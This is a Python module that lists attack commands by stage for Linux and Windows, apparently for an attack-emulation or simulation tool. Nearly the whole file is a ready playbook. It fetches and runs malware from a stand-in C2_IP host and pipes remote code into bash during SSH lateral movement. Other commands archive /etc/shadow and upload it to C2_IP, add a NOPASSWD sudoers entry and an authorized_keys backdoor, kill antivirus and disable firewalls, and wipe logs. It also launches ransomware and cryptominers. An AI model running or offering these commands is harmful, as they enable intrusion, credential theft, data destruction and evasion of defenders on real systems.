"""
Defines all command categories and their OS-specific implementations
"""
import time

# Initial access commands
initial_access_commands = {
    "linux": [
        {"cmd": "wget http://C2_IP/malware.sh -O /tmp/.malware && chmod +x /tmp/.malware", "type": "download", "timestamp": time.time()},
        {"cmd": "curl -s http://C2_IP/beacon || ping -c 4 C2_IP", "type": "beacon", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "certutil -urlcache -split -f http://C2_IP/malware.exe C:\\Windows\\Temp\\svchost.exe", "type": "download", "timestamp": time.time()},
        {"cmd": "bitsadmin /transfer malware /download /priority normal http://C2_IP/beacon C:\\beacon.txt", "type": "beacon", "timestamp": time.time()},
    ],
}

# Recon commands
recon_commands = {
    "linux": [
        {"cmd": "whoami", "type": "shell", "timestamp": time.time()},
        {"cmd": "uname -a", "type": "shell", "timestamp": time.time()},
        {"cmd": "ifconfig || ip a", "type": "shell", "timestamp": time.time()},
        {"cmd": "netstat -antup", "type": "shell", "timestamp": time.time()},
        {"cmd": "cat /etc/passwd", "type": "shell", "timestamp": time.time()},
        {"cmd": "sudo -l", "type": "shell", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "whoami", "type": "shell", "timestamp": time.time()},
        {"cmd": "systeminfo", "type": "shell", "timestamp": time.time()},
        {"cmd": "ipconfig /all", "type": "shell", "timestamp": time.time()},
        {"cmd": "netstat -ano", "type": "shell", "timestamp": time.time()},
        {"cmd": "type C:\\Windows\\System32\\drivers\\etc\\hosts", "type": "shell", "timestamp": time.time()},
        {"cmd": "net user", "type": "shell", "timestamp": time.time()},
        {"cmd": "whoami /priv", "type": "shell", "timestamp": time.time()},
    ],
}

# Privilege escalation commands
privilege_escalation_commands = {
    "linux": [
        {"cmd": "find / -perm -4000 2>/dev/null", "type": "exploit_check", "timestamp": time.time()},
        {"cmd": "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "type": "exploit", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "sc query state= all | findstr \"SERVICE_NAME\"", "type": "service_enum", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Add-Service -Name 'FakeService' -BinaryPath 'C:\\malware.exe'\"", "type": "exploit", "timestamp": time.time()},
    ],
}

# Persistence commands
persistence_commands = {
    "linux": [
        {"cmd": "(crontab -l ; echo \"@reboot /tmp/malware\") | crontab -", "type": "persistence", "timestamp": time.time()},
        {"cmd": "echo \"ssh-rsa ATTACKER_PUB_KEY\" >> ~/.ssh/authorized_keys", "type": "persistence", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\malware.exe\"", "type": "persistence", "timestamp": time.time()},
        {"cmd": "schtasks /create /tn \"Cleanup\" /tr \"C:\\malware.exe\" /sc hourly /mo 1", "type": "persistence", "timestamp": time.time()},
    ],
}

# Lateral movement commands
lateral_movement_commands = {
    "linux": [
        {"cmd": "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@TARGET_IP 'curl http://C2_IP/malware | bash'", "type": "ssh", "timestamp": time.time()},
        {"cmd": "smbclient -U 'user%password' //TARGET_IP/share -c 'put malware'", "type": "smb", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "psexec.exe \\\\TARGET_IP -u admin -p password -accepteula -d malware.exe", "type": "psexec", "timestamp": time.time()},
        {"cmd": "wmic /node:TARGET_IP process call create 'cmd /c malware.exe'", "type": "wmi", "timestamp": time.time()},
    ],
}

# Defense evasion commands
defense_evasion_commands = {
    "linux": [
        {"cmd": "chattr +i /tmp/malware", "type": "file_hiding", "timestamp": time.time()},
        {"cmd": "kill -9 $(ps aux | grep '[a]ntivirus' | awk '{print $2}')", "type": "process_kill", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "attrib +h +s C:\\malware.exe", "type": "file_hiding", "timestamp": time.time()},
        {"cmd": "netsh advfirewall set allprofiles state off", "type": "disable_firewall", "timestamp": time.time()},
    ],
}

# Exfiltration commands
exfiltration_commands = {
    "linux": [
        {"cmd": "tar -czvf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow", "type": "archive", "timestamp": time.time()},
        {"cmd": "curl -X POST --data-binary @/tmp/stolen_data.tar.gz http://C2_IP/exfil", "type": "upload", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell Compress-Archive -Path C:\\Documents\\* -DestinationPath C:\\stolen.zip", "type": "archive", "timestamp": time.time()},
        {"cmd": "certutil -encode C:\\stolen.zip C:\\stolen.b64 && curl -F 'data=@C:\\stolen.b64' http://C2_IP/exfil", "type": "upload", "timestamp": time.time()},
    ],
}

# Cleanup commands
cleanup_commands = {
    "linux": [
        {"cmd": "shred -zu /var/log/auth.log", "type": "log_wipe", "timestamp": time.time()},
        {"cmd": "history -c && rm -f ~/.bash_history", "type": "history_wipe", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "wevtutil cl security", "type": "log_wipe", "timestamp": time.time()},
        {"cmd": "del /f /q C:\\malware.exe", "type": "file_deletion", "timestamp": time.time()},
    ],
}

# Payload commands
payload_commands = {
    "linux": [
        {"cmd": "./malware --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time()},
        {"cmd": "nohup ./miner -o xmr.pool.com -u WALLET_ADDRESS &", "type": "cryptojacking", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "malware.exe --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time()},
        {"cmd": "start /B miner.exe -o xmr.pool.com -u WALLET_ADDRESS", "type": "cryptojacking", "timestamp": time.time()},
    ],
}

# Command execution order
ORDER = [
    initial_access_commands,
    recon_commands,
    privilege_escalation_commands,
    persistence_commands,
    lateral_movement_commands,
    exfiltration_commands,
    defense_evasion_commands,
    cleanup_commands,
    payload_commands,
]

def get_commands_for_os(os_type):
    """
    Returns a list of commands appropriate for the given OS type
    """
    if os_type not in ["linux", "windows"]:
        raise ValueError(f"Unsupported OS type: {os_type}")
        
    return [cmd_group[os_type] for cmd_group in ORDER]